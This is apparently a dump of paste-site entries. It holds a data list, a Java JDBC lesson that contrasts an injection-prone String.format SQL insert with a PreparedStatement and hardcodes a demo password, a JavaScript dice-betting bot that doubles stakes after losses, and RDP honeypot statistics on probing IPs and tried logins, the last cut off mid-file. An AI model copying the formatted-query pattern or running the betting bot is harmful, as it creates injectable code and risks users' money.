,""numero"":5461},{""emblema"":""MM011"",""numero"":5057},{""emblema"":""MM012"",""numero"":5383},{""emblema"":""MM013"",""numero"":4677},{""emblema"":""MM014"",""numero"":3938},{""emblema"":""MM015"",""numero"":581},{""emblema"":""MS2"",""numero"":1138},{""emblema"":""MXH05"",""numero"":3073},{""emblema"":""MXH08"",""numero"":1457},{""emblema"":""MXH09"",""numero"":2428},{""emblema"":""MXH21"",""numero"":1219},{""emblema"":""MXH22"",""numero"":1230},{""emblema"":""MXH24"",""numero"":1745},{""emblema"":""MXH25"",""numero"":1993},{""emblema"":""MXH26"",""numero"":1290},{""emblema"":""MXH27"",""numero"":2103},{""emblema"":""MXH28"",""numero"":750},{""emblema"":""NIB01"",""numero"":722},{""emblema"":""NIB02"",""numero"":721},{""emblema"":""NL097"",""numero"":153},{""emblema"":""NL187"",""numero"":3439},{""emblema"":""NL188"",""numero"":338},{""emblema"":""NL207"",""numero"":881},{""emblema"":""NL214"",""numero"":2716},{""emblema"":""NL240"",""numero"":133},{""emblema"":""NL248"",""numero"":6001},{""emblema"":""NL249"",""numero"":4610},{""emblema"":""NL250"",""numero"":4685},{""emblema"":""NL251"",""numero"":4468},{""emblema"":""NL257"",""numero"":6488},{""emblema"":""NL291"",""numero"":464},{""emblema"":""NL306"",""numero"":967},{""emblema"":""NL330"",""numero"":2437},{""emblema"":""NL355"",""numero"":4198},{""emblema"":""NL367"",""numero"":2803},{""emblema"":""NL381"",""numero"":3234},{""emblema"":""NO122"",""numero"":2537},{""emblema"":""NO127"",""numero"":2440},{""emblema"":""NO133"",""numero"":2386},{""emblema"":""NO136"",""numero"":2473},{""emblema"":""NO138"",""numero"":2262},{""emblema"":""NO142"",""numero"":1650},{""emblema"":""NO144"",""numero"":2175},{""emblema"":""NO169"",""numero"":9665},{""emblema"":""NT129"",""numero"":246},{""emblema"":""NT365"",""numero"":3206},{""emblema"":""PAR01"",""numero"":9966},{""emblema"":""PAR02"",""numero"":9332},{""emblema"":""PAR03"",""numero"":8381},{""emblema"":""PAR04"",""numero"":6031},{""emblema"":""PAR05"",""numero"":6499},{""emblema"":""PAR12"",""numero"":4543},{""emblema"":""PAR13"",""numero"":2852},{""emblema"":""PAR17"",""numero"":8158},{""emblema"":""PLZ01"",""numero"":6017},{""emblema"":""PLZ02"",""numero"":6007},{""emblema"":""PLZ03"",""numero"":6005},{""emblema"":""PLZ04"",""numero"":6000},{""emblema"":""PLZ05"",""numero"":5842},{""emblema"":""PLZ06"",""numero"":6356},{""emblema"":""PLZ07"",""numero"":6000},{""emblema"":""PLZ08"",""numero"":6000},{""emblema"":""PLZ09"",""numero"":5092},{""emblema"":""PLZ10"",""numero"":5240},{""emblema"":""PLZ11"",""numero"":5432},{""emblema"":""PLZ12"",""numero"":6001},{""emblema"":""PLZ13"",""numero"":5229},{""emblema"":""PLZ14"",""numero"":5100},{""emblema"":""PLZ19"",""numero"":8854},{""emblema"":""PLZ20"",""numero"":7733},{""emblema"":""PLZ21"",""numero"":4483},{""emblema"":""PLZ23"",""numero"":982},{""emblema"":""PLZ26"",""numero"":1330},{""emblema"":""PRT01"",""numero"":3378},{""emblema"":""PRT02"",""numero"":3663},{""emblema"":""PRT03"",""numero"":502},{""emblema"":""PRT07"",""numero"":783},{""emblema"":""PX05"",""numero"":6007},{""emblema"":""RADZZ"",""numero"":65535},{""emblema"":""RUN03"",""numero"":128},{""emblema"":""SC001"",""numero"":1369},{""emblema"":""SC002"",""numero"":175},{""emblema"":""SC003"",""numero"":2270},{""emblema"":""SC004"",""numero"":4492},{""emblema"":""SC005"",""numero"":2429},{""emblema"":""SCE01"",""numero"":3964},{""emblema"":""SCE02"",""numero"":7315},{""emblema"":""SCE03"",""numero"":2433},{""emblema"":""SCE04"",""numero"":9388},{""emblema"":""SCE05"",""numero"":3328},{""emblema"":""SCE06"",""numero"":6001},{""emblema"":""SCE07"",""numero"":3429},{""emblema"":""SCE08"",""numero"":7444},{""emblema"":""SCE09"",""numero"":2844},{""emblema"":""SCE10"",""numero"":8196},{""emblema"":""SCE11"",""numero"":2953},{""emblema"":""SCE12"",""numero"":8098},{""emblema"":""SCE13"",""numero"":3620},{""emblema"":""SCE14"",""numero"":8150},{""emblema"":""SCE15"",""numero"":3432},{""emblema"":""SCE16"",""numero"":9587},{""emblema"":""SCE17"",""numero"":2856},{""emblema"":""SCE18"",""numero"":8097},{""emblema"":""SCE19"",""numero"":3022},{""emblema"":""SCE20"",""numero"":8092},{""emblema"":""SCE22"",""numero"":332},{""emblema"":""SCE23"",""numero"":59},{""emblema"":""SCE24"",""numero"":20},{""emblema"":""SE095"",""numero"":112},{""emblema"":""SE114"",""numero"":913},{""emblema"":""SF6"",""numero"":85},{""emblema"":""STO01"",""numero"":5228},{""emblema"":""TBLT2"",""numero"":21051},{""emblema"":""THI76"",""numero"":124},{""emblema"":""THI77"",""numero"":3399},{""emblema"":""THI78"",""numero"":96},{""emblema"":""THI98"",""numero"":4861},{""emblema"":""TIK02"",""numero"":2753},{""emblema"":""TR154"",""numero"":4807},{""emblema"":""TR174"",""numero"":5715},{""emblema"":""TR175"",""numero"":4796},{""emblema"":""TR186"",""numero"":762},{""emblema"":""TR238"",""numero"":1116},{""emblema"":""TR301"",""numero"":36},{""emblema"":""TR314"",""numero"":2457},{""emblema"":""UK001"",""numero"":18},{""emblema"":""UK007"",""numero"":4210},{""emblema"":""UK080"",""numero"":46},{""emblema"":""UK148"",""numero"":3685},{""emblema"":""UK162"",""numero"":4766},{""emblema"":""UK187"",""numero"":15},{""emblema"":""UK216"",""numero"":4843},{""emblema"":""UK246"",""numero"":3838},{""emblema"":""UK247"",""numero"":30},{""emblema"":""UK252"",""numero"":1001},{""emblema"":""UK260"",""numero"":169},{""emblema"":""UK274"",""numero"":2796},{""emblema"":""UK299"",""numero"":1543},{""emblema"":""UK301"",""numero"":3781},{""emblema"":""UK302"",""numero"":3699},{""emblema"":""UK316"",""numero"":6006},{""emblema"":""UK330"",""numero"":6738},{""emblema"":""UK343"",""numero"":5807},{""emblema"":""UK352"",""numero"":6931},{""emblema"":""UK360"",""numero"":185},{""emblema"":""UK367"",""numero"":260},{""emblema"":""UK379"",""numero"":638},{""emblema"":""UK381"",""numero"":3870},{""emblema"":""UK384"",""numero"":112},{""emblema"":""UK385"",""numero"":3201},{""emblema"":""UK393"",""numero"":3156},{""emblema"":""UK395"",""numero"":2792},{""emblema"":""UK404"",""numero"":2615},{""emblema"":""UK406"",""numero"":233},{""emblema"":""UK410"",""numero"":66},{""emblema"":""UK451"",""numero"":610},{""emblema"":""UK453"",""numero"":2244},{""emblema"":""UK473"",""numero"":165},{""emblema"":""UK475"",""numero"":2098},{""emblema"":""UK479"",""numero"":104},{""emblema"":""UK495"",""numero"":1826},{""emblema"":""UK5"",""numero"":2965},{""emblema"":""UK511"",""numero"":328},{""emblema"":""UK520"",""numero"":19},{""emblema"":""UKE"",""numero"":43},{""emblema"":""UKF"",""numero"":47},{""emblema"":""US08"",""numero"":3905},{""emblema"":""US0K"",""numero"":161},{""emblema"":""US0O"",""numero"":99},{""emblema"":""US0U"",""numero"":1862},{""emblema"":""USX"",""numero"":6559},{""emblema"":""VIK02"",""numero"":7163},{""emblema"":""VIK04"",""numero"":2308},{""emblema"":""VIK07"",""numero"":1330},{""emblema"":""VIK12"",""numero"":502},{""emblema"":""VIK17"",""numero"":827},{""emblema"":""VIK19"",""numero"":565},{""emblema"":""VIK24"",""numero"":2807},{""emblema"":""VIK26"",""numero"":2677},{""emblema"":""VIK28"",""numero"":2522},{""emblema"":""VIK30"",""numero"":2572},{""emblema"":""VIK31"",""numero"":2678},{""emblema"":""VIK32"",""numero"":2668},{""emblema"":""VIK33"",""numero"":2243},{""emblema"":""VIK34"",""numero"":2481},{""emblema"":""VIK36"",""numero"":2064},{""emblema"":""VIK38"",""numero"":2176},{""emblema"":""VIK42"",""numero"":320},{""emblema"":""VRD01"",""numero"":760},{""emblema"":""WCS02"",""numero"":713},{""emblema"":""WCS03"",""numero"":5811},{""emblema"":""WCS06"",""numero"":4468},{""emblema"":""WCS07"",""numero"":6013},{""emblema"":""WCS09"",""numero"":3704},{""emblema"":""WCS11"",""numero"":6996},{""emblema"":""WCS14"",""numero"":5373},{""emblema"":""WCS16"",""numero"":6000},{""emblema"":""WCS18"",""numero"":6035},{""emblema"":""WCS20"",""numero"":4909},{""emblema"":""WCS22"",""numero"":4993},{""emblema"":""WCS24"",""numero"":7064},{""emblema"":""WCS25"",""numero"":5848},{""emblema"":""WCS27"",""numero"":6004},{""emblema"":""WCS30"",""numero"":1690},{""emblema"":""WCS31"",""numero"":6007},{""emblema"":""WCS33"",""numero"":6034},{""emblema"":""WCS35"",""numero"":6000},{""emblema"":""WCS37"",""numero"":7135},{""emblema"":""WCS39"",""numero"":6004},{""emblema"":""WCS42"",""numero"":2006},{""emblema"":""WCS43"",""numero"":3619},{""emblema"":""WCS46"",""numero"":3082},{""emblema"":""WCS48"",""numero"":2247},{""emblema"":""WCS51"",""numero"":4463},{""emblema"":""WCS52"",""numero"":6000},{""emblema"":""WCS53"",""numero"":3694},{""emblema"":""WCS54"",""numero"":7699},{""emblema"":""WCS55"",""numero"":5369},{""emblema"":""WCS57"",""numero"":6025},{""emblema"":""WCS59"",""numero"":7130},{""emblema"":""WCS60"",""numero"":7040},{""emblema"":""WCS62"",""numero"":6015},{""emblema"":""WCS64"",""numero"":6012},{""emblema"":""WCS65"",""numero"":6011},{""emblema"":""WCS66"",""numero"":6005},{""emblema"":""WCS67"",""numero"":7092},{""emblema"":""WCS68"",""numero"":6009},{""emblema"":""WCS69"",""numero"":2006},{""emblema"":""WCS70"",""numero"":3628},{""emblema"":""WCS71"",""numero"":3093},{""emblema"":""WCS74"",""numero"":6463},{""emblema"":""WCS75"",""numero"":6448},{""emblema"":""WCS82"",""numero"":1063},{""emblema"":""WCS83"",""numero"":3877},{""emblema"":""WCS84"",""numero"":3800},{""emblema"":""WCS85"",""numero"":3545},{""emblema"":""WCS86"",""numero"":3275},{""emblema"":""WCS87"",""numero"":3274},{""emblema"":""WCS88"",""numero"":1097},{""emblema"":""WED01"",""numero"":763},{""emblema"":""WH3"",""numero"":101},{""emblema"":""WWB03"",""numero"":275},{""emblema"":""WWB09"",""numero"":357},{""emblema"":""WWB10"",""numero"":358},{""emblema"":""WWB11"",""numero"":4871},{""emblema"":""WWB12"",""numero"":4655},{""emblema"":""WWB13"",""numero"":4425},{""emblema"":""WWB14"",""numero"":4116},{""emblema"":""WWB15"",""numero"":3702},{""emblema"":""WWB16"",""numero"":4905},{""emblema"":""WWB17"",""numero"":4759},{""emblema"":""WWB18"",""numero"":4506},{""emblema"":""WWB19"",""numero"":4175},{""emblema"":""WWB20"",""numero"":3778},{""emblema"":""WWB21"",""numero"":3089},{""emblema"":""WWB22"",""numero"":2944},{""emblema"":""WWB23"",""numero"":2740},{""emblema"":""WWB24"",""numero"":2535},{""emblema"":""WWB25"",""numero"":2170},{""emblema"":""WWB26"",""numero"":8975},{""emblema"":""WWB27"",""numero"":6011},{""emblema"":""WWB28"",""numero"":6008},{""emblema"":""WWB29"",""numero"":6015},{""emblema"":""WWB30"",""numero"":5796},{""emblema"":""WWB31"",""numero"":5229},{""emblema"":""WWB32"",""numero"":8474},{""emblema"":""WWB34"",""numero"":895},{""emblema"":""WWB35"",""numero"":1068},{""emblema"":""WWB36"",""numero"":1064},{""emblema"":""WWB38"",""numero"":1194},{""emblema"":""WWR01"",""numero"":2703},{""emblema"":""X1402"",""numero"":1267},{""emblema"":""X1403"",""numero"":2283},{""emblema"":""X1404"",""numero"":1421},{""emblema"":""X1405"",""numero"":1177},{""emblema"":""X1406"",""numero"":244},{""emblema"":""X1502"",""numero"":3069},{""emblema"":""X1513"",""numero"":82},{""emblema"":""X1518"",""numero"":4315},{""emblema"":""X1519"",""numero"":4683},{""emblema"":""X1520"",""numero"":4873},{""emblema"":""X1521"",""numero"":5149},{""emblema"":""X1522"",""numero"":3530},{""emblema"":""X1523"",""numero"":3483},{""emblema"":""X1524"",""numero"":3880},{""emblema"":""X1525"",""numero"":3934},{""emblema"":""X1526"",""numero"":3545},{""emblema"":""X1527"",""numero"":3781},{""emblema"":""X1528"",""numero"":3273},{""emblema"":""X1529"",""numero"":2569},{""emblema"":""X1530"",""numero"":2351},{""emblema"":""X1531"",""numero"":2149},{""emblema"":""XM8"",""numero"":1824},{""emblema"":""XMH11"",""numero"":2291},{""emblema"":""XMH12"",""numero"":2161},{""emblema"":""XMH13"",""numero"":2267},{""emblema"":""XMH14"",""numero"":2146},{""emblema"":""XMH15"",""numero"":2186},{""emblema"":""XMH16"",""numero"":2082},{""emblema"":""XMH17"",""numero"":2233},{""emblema"":""XMH18"",""numero"":2385},{""emblema"":""XMH19"",""numero"":2910},{""emblema"":""XMH20"",""numero"":2282},{""emblema"":""YAK"",""numero"":6933},{""emblema"":""Z20"",""numero"":202},{""emblema"":""Z68"",""numero"":2737},{""emblema"":""Z70"",""numero"":3076},{""emblema"":""Z84"",""numero"":33},{""emblema"":""ZLD03"",""numero"":4069},{""emblema"":""ES414"",""numero"":553},{""emblema"":""FR561"",""numero"":2704},{""emblema"":""IT133"",""numero"":121},{""emblema"":""ITA03"",""numero"":248},{""emblema"":""TR342"",""numero"":21},{""emblema"":""BR941"",""numero"":43},{""emblema"":""BR806"",""numero"":67},{""emblema"":""NO158"",""numero"":12},{""emblema"":""UK314"",""numero"":50},{""emblema"":""AGC01"",""numero"":24},{""emblema"":""DE530"",""numero"":143},{""emblema"":""ES843"",""numero"":63},{""emblema"":""IT833"",""numero"":78},{""emblema"":""IT974"",""numero"":19},{""emblema"":""DE022"",""numero"":52},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0},{""emblema"":null,""numero"":0}]"
CR9LKpZr,Day 16 statements,HarrJ,Java,Sunday 18th of February 2024 07:08:23 PM CDT,"package week3;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.Statement;

public class Day16A {
    private String address = ""jdbc:mysql://localhost:3306/db_jtvi_b8_23"";
    private String userName = ""jtvi23b8""; //default ""root""
    private String passWord = ""demo""; //default """"
    
    public static void main(String[] args) {
        Day16A callMe = new Day16A();

        String itemName = textPicker(); // ""Janny"";
        String itemDesc = ""statement test"";
        double itemValue = Math.random() * 4000; // random para di na ako type ng type

//        callMe.addNewRowA(itemName, itemDesc, itemValue);
       
        System.out.println(""-----------------------"");
        itemName = textPicker(); // ""Janny"";
        itemDesc = ""prep statement' test"";
        itemValue = Math.random() * 4000;
        
        int result = callMe.addNewRowB(itemName, itemDesc, itemValue);
        System.out.println(result + "" row(s) affected"");
        
    }
    
    void addNewRowA(String itemName, String itemDesc, double itemValue) {
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            int rowsAffected = 0;
            //PREPARE INFO
            
            String sqlQuery = ""INSERT INTO tbl_item_list""
                    + "" ( fld_item_name , fld_item_desc , fld_item_value)""
                    + "" VALUES ('%s', '%s', %.4f);"";
            
            sqlQuery = String.format(sqlQuery, itemName, itemDesc, itemValue);
            System.out.println(sqlQuery);
            
            Statement stmt = conn.createStatement();
            rowsAffected = stmt.executeUpdate(sqlQuery);
            
            if (rowsAffected == 1) {
                System.out.println(""new row added"");
            } else {
                System.out.println(""no row added"");
            }
            
            conn.close();
        } catch (Exception e) {
            System.out.println(""connection error"");
            System.out.println(e.toString());
        }
        
    }
    
    static String textPicker() {
        String[] txtList = {""book"", ""magazine"", ""novel"", ""e book"", ""hardbound""};
        int index = (int) (Math.random() * txtList.length);
        return txtList[index];
    }
    
    int addNewRowB (String itemName, String itemDesc, double itemValue) {
        int rowsAffected = 0;
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            
            String sqlQuery = ""INSERT INTO tbl_item_list""
                    + "" ( fld_item_name , fld_item_desc , fld_item_value)""
                    + "" VALUES (?, ?, ?);"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            stmt.setString(1, itemName); //use proper set, starts at 1
            stmt.setString(2, itemDesc);
            stmt.setDouble(3, itemValue);
            
            rowsAffected = stmt.executeUpdate();
            
            conn.close();
        } catch (Exception e) {
            rowsAffected = -1;
        }
        return rowsAffected;
    }
}
"
22tcZbae,atomic snowybot,coinwalk,JavaScript,Sunday 18th of February 2024 06:44:13 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var dockiez = original;
var divide = 144;
var vein = (divide/10);
var base = Number((original/divide).toFixed(8));
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var tiffy = 0;
var snowy = base;
var bilance = original;
var good = (((bilance-original)*1).toFixed(8));
 
function dobet(){
bilance = document.getElementById('pct_balance').value;
good = (((bilance-original)*1).toFixed(8));
console.log(""profit"");
console.log(good);
    if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=tiffy)){
        snowy = snowy*2;
        tiffy = parseFloat(bilance);
    }
    if ((bilance-(snowy*vein))<=(bilance/5)){
        snowy = base;
        tiffy = 0;
    }
    if ((original-(snowy*vein))<=(original/5)){
        snowy = base;
        tiffy = 0;
    }
    if (bilance<base) {
        console.log(""busted"");     
        return;
    }
    if (bilance>=1000) {
       console.log(""winner winner chicken dinner"");
       return;
   }
$('#pct_chance').val(49.5);
$('#pct_bet').val(((snowy*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => dobet(), 350)
} 
dobet();
"
tY9ZDMhj,2024-02-18_stats.json,rdp_snitch,JSON,Sunday 18th of February 2024 06:17:58 PM CDT,"{
  ""ip"": {
    ""45.227.254.55"": 6,
    ""194.165.16.78"": 12,
    ""173.239.214.30"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""205.210.31.65"": 9,
    ""172.206.250.19"": 3,
    ""212.70.149.142"": 15,
    ""87.251.75.145"": 9,
    ""167.94.138.125"": 3,
    ""194.165.16.76"": 6,
    ""185.170.144.3"": 6,
    ""36.91.222.100"": 3,
    ""205.210.31.184"": 9,
    ""45.227.254.48"": 6,
    ""38.130.226.109"": 3,
    ""103.192.198.60"": 6,
    ""200.35.53.121"": 3,
    ""61.91.43.232"": 3,
    ""185.170.144.113"": 9,
    ""179.60.147.129"": 3,
    ""118.193.32.88"": 3,
    ""45.137.201.204"": 3,
    ""205.210.31.168"": 9,
    ""167.248.133.38"": 3,
    ""87.251.75.64"": 3,
    ""45.131.195.114"": 3,
    ""120.240.145.8"": 3,
    ""45.93.20.204"": 9,
    ""194.165.16.72"": 6,
    ""167.94.145.55"": 3,
    ""198.235.24.201"": 9,
    ""79.124.62.106"": 3,
    ""149.34.246.34"": 3,
    ""216.24.210.126"": 3
  },
  ""asn"": {
    ""AS267784"": 12,
    ""AS48721"": 24,
    ""AS62240"": 9,
    ""AS208046"": 18,
    ""AS396982"": 36,
    ""AS8075"": 3,
    ""AS204428"": 15,
    ""AS208091"": 12,
    ""AS398324"": 6,
    ""AS197414"": 15,
    ""AS7713"": 3,
    ""AS13886"": 3,
    ""AS59187"": 6,
    ""AS27695"": 3,
    ""AS7470"": 3,
    ""AS209588"": 3,
    ""AS135377"": 3,
    ""AS49581"": 3,
    ""AS56040"": 3,
    ""AS57523"": 9,
    ""AS398705"": 3,
    ""AS207812"": 3,
    ""AS212238"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 39,
    ""LogicWeb Inc."": 3,
    ""ColocationX Ltd."": 18,
    ""Google LLC"": 36,
    ""Microsoft"": 3,
    ""SS-Net"": 15,
    ""Xhost Internet Solutions LP"": 27,
    ""Censys, Inc."": 9,
    ""PT Telekomunikasi Indonesia"": 3,
    ""Cloud South"": 3,
    ""Neevai Supercloud PVT LTD"": 6,
    ""Edatel S.a. E.S.P"": 3,
    ""True Internet Corporation CO. Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Ferdinand Zink trading as Tube-Hosting"": 3,
    ""VPN"": 3,
    ""China Mobile communications corporation"": 3,
    ""Chang Way Technologies Co. Limited"": 9,
    ""DM AUTO EOOD"": 3,
    ""Datacamp Limited"": 3,
    ""Clouvider Limited"": 3
  },
  ""org"": {
    ""UAB Host Baltic"": 12,
    ""Flyservers S.A"": 24,
    ""NSQ-VENTURE"": 3,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""4Media Ltd"": 15,
    ""Xhost Internet Solutions"": 12,
    ""Censys, Inc"": 3,
    ""Xhostis"": 15,
    ""Telekomunikasi Indonesia"": 3,
    ""Cloud South"": 3,
    ""Neevai Supercloud PVT LTD"": 6,
    ""Edatel S.a. E.S.P"": 3,
    ""True Internet Corporation CO. LTD"": 3,
    ""Cloud Solutions S.A"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Taurus"": 3,
    ""Censys, Inc."": 6,
    ""VPN-Consumer-US"": 3,
    ""China Mobile"": 3,
    ""Starcrecium Limited"": 9,
    ""Internet Solutions & Innovations LTD"": 3,
    ""Datacamp Limited"": 3,
    ""IPXO"": 3
  },
  ""regionName"": {
    ""Vilnius"": 12,
    ""Kaunas"": 24,
    ""New Jersey"": 6,
    ""Virginia"": 12,
    ""North Holland"": 36,
    ""California"": 39,
    ""Plovdiv"": 15,
    ""Michigan"": 6,
    ""Jakarta"": 3,
    ""Florida"": 3,
    ""Madhya Pradesh"": 6,
    ""Antioquia"": 3,
    ""Bangkok"": 3,
    ""Distrito Federal"": 3,
    ""Kowloon"": 3,
    ""Lombardy"": 3,
    ""Guangdong"": 3,
    ""Moscow"": 9,
    ""Hesse"": 6,
    ""English River"": 3
  },
  ""country"": {
    ""Lithuania"": 36,
    ""United States"": 66,
    ""The Netherlands"": 36,
    ""Bulgaria"": 15,
    ""Indonesia"": 3,
    ""India"": 6,
    ""Colombia"": 3,
    ""Thailand"": 3,
    ""Venezuela"": 3,
    ""Hong Kong"": 3,
    ""Italy"": 3,
    ""China"": 3,
    ""Russia"": 9,
    ""Germany"": 6,
    ""Seychelles"": 3
  },
  ""account"": {
    ""Test"": 42,
    ""(empty)"": 24,
    ""Domain"": 36,
    ""nlHOiOUso"": 3,
    ""yqrSRV"": 3,
    ""rYsptK"": 3,
    ""hello"": 15,
    ""Administr"": 39,
    ""zkddjUWoL"": 3,
    ""XmFZgS"": 3,
    ""eAWPKV"": 3,
    ""a"": 3,
    ""Administrator"": 3,
    ""XHKjYrxdI"": 3,
    ""EQHnvu"": 3,
    ""dYEwCt"": 3,
    ""jKTWmDOXJ"": 3,
    ""UUZpmx"": 3,
    ""yzEcZK"": 3
  },
  ""keyboard"": {
    ""Unknown"": 198
  },
  ""client_build"": {
    ""Unknown"": 198
  },
  ""client_name"": {
    ""Unknown"": 198
  },
  ""ip_type"": {
    ""Unknown"": 123,
    ""hosting & proxy"": 6,
    ""mobile"": 12,
    ""hosting"": 45,
    ""proxy"": 9,
    ""mobile & hosting & proxy"": 3
  }
}"
ymLDYe0m,2024-02-18_stats.json,rdp_snitch,JSON,Sunday 18th of February 2024 06:16:10 PM CDT,"{
  ""ip"": {
    ""45.227.254.55"": 4,
    ""194.165.16.78"": 8,
    ""173.239.214.30"": 2,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""205.210.31.65"": 6,
    ""172.206.250.19"": 2,
    ""212.70.149.142"": 10,
    ""87.251.75.145"": 6,
    ""167.94.138.125"": 2,
    ""194.165.16.76"": 4,
    ""185.170.144.3"": 4,
    ""36.91.222.100"": 2,
    ""205.210.31.184"": 6,
    ""45.227.254.48"": 4,
    ""38.130.226.109"": 2,
    ""103.192.198.60"": 4,
    ""200.35.53.121"": 2,
    ""61.91.43.232"": 2,
    ""185.170.144.113"": 6,
    ""179.60.147.129"": 2,
    ""118.193.32.88"": 2,
    ""45.137.201.204"": 2,
    ""205.210.31.168"": 6,
    ""167.248.133.38"": 2,
    ""87.251.75.64"": 2,
    ""45.131.195.114"": 2,
    ""120.240.145.8"": 2,
    ""45.93.20.204"": 6,
    ""194.165.16.72"": 4,
    ""167.94.145.55"": 2,
    ""198.235.24.201"": 6,
    ""79.124.62.106"": 2,
    ""149.34.246.34"": 2,
    ""216.24.210.126"": 2
  },
  ""asn"": {
    ""AS267784"": 8,
    ""AS48721"": 16,
    ""AS62240"": 6,
    ""AS208046"": 12,
    ""AS396982"": 24,
    ""AS8075"": 2,
    ""AS204428"": 10,
    ""AS208091"": 8,
    ""AS398324"": 4,
    ""AS197414"": 10,
    ""AS7713"": 2,
    ""AS13886"": 2,
    ""AS59187"": 4,
    ""AS27695"": 2,
    ""AS7470"": 2,
    ""AS209588"": 2,
    ""AS135377"": 2,
    ""AS49581"": 2,
    ""AS56040"": 2,
    ""AS57523"": 6,
    ""AS398705"": 2,
    ""AS207812"": 2,
    ""AS212238"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 26,
    ""LogicWeb Inc."": 2,
    ""ColocationX Ltd."": 12,
    ""Google LLC"": 24,
    ""Microsoft"": 2,
    ""SS-Net"": 10,
    ""Xhost Internet Solutions LP"": 18,
    ""Censys, Inc."": 6,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Cloud South"": 2,
    ""Neevai Supercloud PVT LTD"": 4,
    ""Edatel S.a. E.S.P"": 2,
    ""True Internet Corporation CO. Ltd."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""VPN"": 2,
    ""China Mobile communications corporation"": 2,
    ""Chang Way Technologies Co. Limited"": 6,
    ""DM AUTO EOOD"": 2,
    ""Datacamp Limited"": 2,
    ""Clouvider Limited"": 2
  },
  ""org"": {
    ""UAB Host Baltic"": 8,
    ""Flyservers S.A"": 16,
    ""NSQ-VENTURE"": 2,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""4Media Ltd"": 10,
    ""Xhost Internet Solutions"": 8,
    ""Censys, Inc"": 2,
    ""Xhostis"": 10,
    ""Telekomunikasi Indonesia"": 2,
    ""Cloud South"": 2,
    ""Neevai Supercloud PVT LTD"": 4,
    ""Edatel S.a. E.S.P"": 2,
    ""True Internet Corporation CO. LTD"": 2,
    ""Cloud Solutions S.A"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Taurus"": 2,
    ""Censys, Inc."": 4,
    ""VPN-Consumer-US"": 2,
    ""China Mobile"": 2,
    ""Starcrecium Limited"": 6,
    ""Internet Solutions & Innovations LTD"": 2,
    ""Datacamp Limited"": 2,
    ""IPXO"": 2
  },
  ""regionName"": {
    ""Vilnius"": 8,
    ""Kaunas"": 16,
    ""New Jersey"": 4,
    ""Virginia"": 8,
    ""North Holland"": 24,
    ""California"": 26,
    ""Plovdiv"": 10,
    ""Michigan"": 4,
    ""Jakarta"": 2,
    ""Florida"": 2,
    ""Madhya Pradesh"": 4,
    ""Antioquia"": 2,
    ""Bangkok"": 2,
    ""Distrito Federal"": 2,
    ""Kowloon"": 2,
    ""Lombardy"": 2,
    ""Guangdong"": 2,
    ""Moscow"": 6,
    ""Hesse"": 4,
    ""English River"": 2
  },
  ""country"": {
    ""Lithuania"": 24,
    ""United States"": 44,
    ""The Netherlands"": 24,
    ""Bulgaria"": 10,
    ""Indonesia"": 2,
    ""India"": 4,
    ""Colombia"": 2,
    ""Thailand"": 2,
    ""Venezuela"": 2,
    ""Hong Kong"": 2,
    ""Italy"": 2,
    ""China"": 2,
    ""Russia"": 6,
    ""Germany"": 4,
    ""Seychelles"": 2
  },
  ""account"": {
    ""Test"": 28,
    ""(empty)"": 16,
    ""Domain"": 24,
    ""nlHOiOUso"": 2,
    ""yqrSRV"": 2,
    ""rYsptK"": 2,
    ""hello"": 10,
    ""Administr"": 26,
    ""zkddjUWoL"": 2,
    ""XmFZgS"": 2,
    ""eAWPKV"": 2,
    ""a"": 2,
    ""Administrator"": 2,
    ""XHKjYrxdI"": 2,
    ""EQHnvu"": 2,
    ""dYEwCt"": 2,
    ""jKTWmDOXJ"": 2,
    ""UUZpmx"": 2,
    ""yzEcZK"": 2
  },
  ""keyboard"": {
    ""Unknown"": 132
  },
  ""client_build"": {
    ""Unknown"": 132
  },
  ""client_name"": {
    ""Unknown"": 132
  },
  ""ip_type"": {
    ""Unknown"": 82,
    ""hosting & proxy"": 4,
    ""mobile"": 8,
    ""hosting"": 30,
    ""proxy"": 6,
